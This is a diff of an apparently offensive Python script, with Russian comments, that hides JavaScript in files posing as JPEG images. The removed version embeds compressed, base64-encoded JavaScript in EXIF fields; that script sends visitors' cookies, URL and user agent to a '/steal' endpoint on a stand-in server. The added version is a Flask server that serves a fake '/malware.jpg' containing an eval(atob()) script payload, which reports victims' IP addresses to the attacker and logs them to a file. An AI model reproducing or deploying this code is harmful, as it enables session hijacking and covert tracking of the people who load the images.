@@ -1,45 +1,36 @@
-#!/usr/bin/env python3
-from PIL import Image
-import piexif
+from flask import Flask, Response, request
 import base64
-import zlib
 
-# Ваш JS код
+app = Flask(__name__)
+
+# JS получает публичный IP через внешний API и отправляет
 js_code = """
-fetch('https://your-server.com/steal', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-        cookies: document.cookie,
-        url: location.href,
-        ua: navigator.userAgent
-    })
-});
+fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(data => {
+        fetch('http://your-server.com:8080/log?ip=' + data.ip);
+    });
 """
 
-# Сжимаем и кодируем
-compressed = zlib.compress(js_code.encode())
-b64_js = base64.b64encode(compressed).decode()
+b64 = base64.b64encode(js_code.encode()).decode()
+payload = f"<script>eval(atob('{b64}'))</script>"
+jpg = bytes([0xFF, 0xD8, 0xFF, 0xE0]) + payload.encode()
 
-# Открываем изображение
-img = Image.open("clean.jpg")
+@app.route('/malware.jpg')
+def malware():
+    return Response(jpg, mimetype='image/jpeg')
 
-# СОЗДАЕМ НОВЫЙ EXIF, если его нет
-exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}}
+@app.route('/log')
+def log():
+    ip = request.args.get('ip', '')
+    victim_ip = request.remote_addr
+    
+    print(f"[+] IP from API: {ip}")
+    print(f"[+] Direct IP: {victim_ip}")
+    
+    with open('ips.txt', 'a') as f:
+        f.write(f"{victim_ip} | {ip}\n")
+    
+    return '', 204
 
-# Добавляем данные в 0th (ImageIFD)
-exif_dict["0th"][piexif.ImageIFD.XPComment] = f"__{b64_js}__".encode('utf-16le')
-
-# Добавляем в Exif
-exif_dict["Exif"][piexif.ExifIFD.UserComment] = f"<script>eval(atob('{b64_js}'))</script>".encode()
-
-# Добавляем в Artist поле
-exif_dict["0th"][piexif.ImageIFD.Artist] = f"eval(atob('{b64_js}'))".encode()
-
-# Конвертируем в байты
-exif_bytes = piexif.dump(exif_dict)
-
-# Сохраняем с EXIF
-img.save("malicious.jpg", exif=exif_bytes, quality=95)
-
-print("[+] Готово: malicious.jpg")
+app.run(host='0.0.0.0', port=8080)
